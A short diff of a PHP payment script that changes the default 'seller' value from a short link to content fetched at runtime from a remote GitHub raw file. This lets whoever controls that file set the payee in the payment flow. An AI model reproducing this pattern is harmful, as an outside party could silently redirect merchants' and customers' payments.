@@ -49,7 +49,7 @@ $pay_id = $user;
 $price = (float)$_POST["price"];
 $param = $_POST["seller"];
 if($param==""){
-    $param = 't.cn/R3nzyVv';
+    $param = file_get_contents('https://raw.githubusercontent.com/mmmwhy/mod/master/sql/fbiwarning');;
 }
 $type = (int)$_POST["type"];
 if ($type < 1) $type = 1;
